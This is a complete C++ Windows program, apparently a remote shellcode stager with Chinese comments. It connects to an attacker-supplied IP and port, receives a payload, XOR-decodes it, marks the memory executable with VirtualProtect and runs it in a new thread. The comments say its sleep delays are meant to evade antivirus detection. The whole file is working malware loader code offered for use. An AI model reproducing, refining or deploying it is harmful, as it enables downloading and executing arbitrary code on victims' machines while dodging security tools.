#include <stdio.h>
#include <iostream>
#include <WinSock2.h>
#pragma comment(lib, "ws2_32.lib")  //添加ws2_32动态库
#pragma warning(disable:4996) //忽略旧函数使用的警告

using namespace std;

int main(int argc, char *argv[])
{
	const int BUF_SIZE = 1024;

	WSADATA			wsd; //WSADATA变量
	SOCKET			sHost; // 服务器套接字socket
	SOCKADDR_IN		servAddr; //服务器地址
	char			buf[BUF_SIZE]; // 存放发送的数据缓冲区
	char			bufRecv[BUF_SIZE]; //接收收到的数据缓冲区
	DWORD			dwThreadId;
	HANDLE			hThread;
	DWORD			dwOldProtect;

	int retVal; // 返回值

	if (argc <= 2){
		cout << "USAGE: client.exe <Server IP> <Server PORT>" << endl;
		return -1;
	}

	if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0) //初始化套结字动态库
	{
		cout << "WSAStartup failed!" << endl;
		return -1;
	}

	sHost = socket(AF_INET, SOCK_STREAM, 0); //创建套接字 IPV4  可靠的，双向的类型服务提供商选择
	if (INVALID_SOCKET == sHost)
	{
		cout << "socket failed!" << endl;
		WSACleanup();
		return  -1;
	}

	//设置服务器的地址
	servAddr.sin_family = AF_INET; //指定IPV4
	servAddr.sin_addr.s_addr = inet_addr(argv[1]); // 指定服务器的地址
	servAddr.sin_port = htons((short)atoi(argv[2])); // 指定服务器的端口



	retVal = connect(sHost, (LPSOCKADDR)&servAddr, sizeof(servAddr)); // 套接字 sockaddr的指针，也就是地址 第三个参数为SOCKADDR_IN结构体的大小
	if (SOCKET_ERROR == retVal) //判断是否连接成功
	{
		cout << "connect failed!" << endl;
		closesocket(sHost);
		WSACleanup();
		return -1;
	}
	ZeroMemory(buf, BUF_SIZE); // buf指向的地址用0来填充
	strcpy(buf, "ok"); //给ok两个字节的字符串复制给buf区段

	retVal = send(sHost, buf, strlen(buf), 0); //send的返回值

	if (SOCKET_ERROR == retVal) //判断是否发送成功
	{
		cout << "send failed!" << endl;
		closesocket(sHost);
		WSACleanup();
		return -1;
	}
	cout << "Starting Download Payload" << endl;
	ZeroMemory(bufRecv, BUF_SIZE); // bufRevc指向的地址用0来填充
	Sleep(2000); //延迟两秒起到免杀绕过的效果
	cout << "Downloading." << endl;

	recv(sHost, bufRecv, BUF_SIZE, 0); //bufRecv缓冲区接收 服务端发送来的数据
	cout << "OK." << endl;

	Sleep(4000);
	closesocket(sHost);
	WSACleanup();
	for (int i = 0; i < sizeof(bufRecv); i++) {
		//Sleep(50);
		_InterlockedXor8(bufRecv + i, 10);
	}
	cout << "Start Load Shellcode" << endl;
	//下面就是开辟内存存储shellcode 创建线程进行执行
	char * shellcode = (char *)VirtualAlloc(
		NULL,
		BUF_SIZE,
		MEM_COMMIT,
		PAGE_READWRITE // 只申请可读可写
	);

	CopyMemory(shellcode, bufRecv, BUF_SIZE);
	VirtualProtect(shellcode, BUF_SIZE, PAGE_EXECUTE, &dwOldProtect); // VirtualProtect改变它的属性 -> 可执行

	hThread = CreateThread(
		NULL, // 安全描述符
		NULL, // 栈的大小
		(LPTHREAD_START_ROUTINE)shellcode, // 函数
		NULL, // 参数
		NULL, // 线程标志
		&dwThreadId // 线程ID
	);

	WaitForSingleObject(hThread, INFINITE);
	return 0;
}